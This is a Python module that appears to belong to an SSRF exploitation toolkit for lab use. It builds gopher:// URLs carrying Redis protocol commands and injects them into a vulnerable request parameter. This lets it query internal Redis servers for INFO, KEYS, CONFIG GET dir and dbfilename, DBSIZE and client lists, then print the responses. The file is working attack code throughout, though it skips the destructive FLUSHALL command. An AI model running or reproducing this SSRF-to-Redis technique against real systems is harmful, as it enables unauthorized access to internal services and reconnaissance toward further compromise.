"""
sedf/modules/redis_gopher.py - Gopher-based Redis interaction via SSRF (FR-06)

Constructs gopher:// URLs that speak the Redis protocol, allowing
read/write interaction with internal Redis instances through SSRF.

FOR AUTHORIZED LAB USE ONLY.
"""

import urllib.parse
from typing import List, Optional, Dict

from sedf.utils.http_client import HTTPClient
from sedf.utils.logger import get_logger

logger = get_logger(__name__)


def _encode_redis_command(*args) -> str:
    """Encode a Redis command in RESP protocol, URL-encoded for gopher://."""
    cmd = f"*{len(args)}\r\n"
    for arg in args:
        cmd += f"${len(arg)}\r\n{arg}\r\n"
    return urllib.parse.quote(cmd, safe="")


def build_gopher_url(ip: str, port: int, *redis_args) -> str:
    """Build a gopher:// URL that sends a Redis RESP command."""
    encoded = _encode_redis_command(*redis_args)
    return f"gopher://{ip}:{port}/_{encoded}"


# Pre-built command set for common Redis operations
def redis_commands(ip: str = "127.0.0.1", port: int = 6379) -> Dict[str, str]:
    return {
        "INFO":         build_gopher_url(ip, port, "INFO"),
        "KEYS *":       build_gopher_url(ip, port, "KEYS", "*"),
        "CONFIG dir":   build_gopher_url(ip, port, "CONFIG", "GET", "dir"),
        "CONFIG dbfilename": build_gopher_url(ip, port, "CONFIG", "GET", "dbfilename"),
        "DBSIZE":       build_gopher_url(ip, port, "DBSIZE"),
        "CLIENT LIST":  build_gopher_url(ip, port, "CLIENT", "LIST"),
        "FLUSHALL (DANGEROUS — read-only by default in SEDF)": None,  # Not sent
    }


class RedisGopherExploiter:
    """
    FR-06: Gopher-based Redis interaction via SSRF.

    Reads Redis information through the SSRF vulnerability using
    the gopher:// protocol to speak directly to Redis over TCP.
    """

    def __init__(self, args, client: HTTPClient, base_url_template: str):
        self.args = args
        self.client = client
        self.base_url = base_url_template
        self.ip = getattr(args, "internal_ip", "127.0.0.1")
        self.port = 6379

    def run(self) -> List[Dict]:
        """Send Redis commands and collect responses."""
        commands = redis_commands(self.ip, self.port)
        logger.info(
            f"[REDIS] Probing Redis on {self.ip}:{self.port} via gopher:// SSRF ..."
        )

        results = []
        for name, url in commands.items():
            if url is None:
                continue  # Skip dangerous write commands
            result = self._probe(name, url)
            if result:
                results.append(result)
                self._print_result(result)

        print(f"\n  Redis probe complete: {len(results)} command(s) returned data.")
        return results

    def _probe(self, command_name: str, gopher_url: str) -> Optional[Dict]:
        if "FUZZ" in self.base_url:
            url = self.base_url.replace("FUZZ", gopher_url)
        else:
            url = gopher_url

        resp = self.client.get(url)
        body = resp.get("body", "")
        status = resp.get("status_code", 0)

        if body.strip() and ("+OK" in body or "+PONG" in body or "redis_version" in body or body.startswith("*") or body.startswith("$")):
            return {
                "command": command_name,
                "gopher_url": gopher_url,
                "status": status,
                "response": body[:1000],
            }
        return None

    @staticmethod
    def _print_result(result: Dict):
        print(f"\n  [REDIS RESPONSE] Command: {result['command']}")
        print(f"  Response: {result['response'][:300]!r}")
